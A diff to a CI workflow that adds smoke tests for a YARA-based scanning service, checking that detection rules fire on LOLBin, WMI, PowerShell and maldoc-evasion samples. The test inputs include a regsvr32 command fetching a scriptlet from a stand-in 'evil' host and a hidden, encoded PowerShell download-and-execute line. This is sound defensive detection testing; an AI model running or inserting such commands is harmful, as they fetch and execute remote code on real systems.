@@ -191,6 +191,41 @@ jobs:
           echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
           docker rm -f yd
 
+      - name: smoke (intent rules — LOLBin/WMI/PowerShell/evasion)
+        run: |
+          set -euo pipefail
+          # Load ONLY the intent rules (isolated, cache off).
+          mkdir -p rules-intent
+          cp docker/local-rules/intent.yara rules-intent/
+          docker run -d --name yi -e YARAD_TOKEN=ci -e YARAD_RULES= -e YARAD_RULES_DIR=/r -e YARAD_CACHE_DIR= \
+            -v "$PWD/rules-intent:/r:ro" -p 18086:8079 yarad:ci
+          for _ in $(seq 1 30); do
+            [ "$(docker inspect -f '{{.State.Health.Status}}' yi)" = healthy ] && break; sleep 1
+          done
+          [ "$(docker inspect -f '{{.State.Health.Status}}' yi)" = healthy ] || { docker logs yi; exit 1; }
+
+          # Each name+arg combo must fire its rule. Bodies built at runtime.
+          l=$(printf 'Shell("regsvr32 /s /n /i:http://evil/a.sct scrobj.dll")\n')
+          ml=$(printf '%s' "$l" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
+          echo "lolbin: $ml"; grep -q LOLBins_Invocation <<<"$ml"
+
+          w=$(printf 'GetObject("winmgmts:").Get("Win32_Process").Create "calc"\n')
+          mw=$(printf '%s' "$w" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
+          echo "wmi: $mw"; grep -q WMI_Process_Spawn <<<"$mw"
+
+          p=$(printf 'powershell -nop -w hidden -enc SQBFAFgAIABEAG8AdwBuAGwAbwBhAGQA\n')
+          mp=$(printf '%s' "$p" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
+          echo "ps: $mp"; grep -q PowerShell_Abuse_Flags <<<"$mp"
+
+          e=$(printf 'On Error Resume Next\nApplication.Visible = False\nx=Environ("USERNAME")\n')
+          me=$(printf '%s' "$e" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
+          echo "evasion: $me"; grep -q Maldoc_AntiAnalysis_Evasion <<<"$me"
+
+          # Negative: bare mentions without abusive args/combos must NOT fire.
+          clean=$(printf 'newsletter about powershell and regsvr32 for admins\n' | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18086/scan)
+          echo "clean: $clean"; [ "$clean" = '{"matches":[]}' ]
+          docker rm -f yi
+
       - name: smoke (seed-on-startup — default cache config + wiped-cache self-heal)
         run: |
           set -euo pipefail
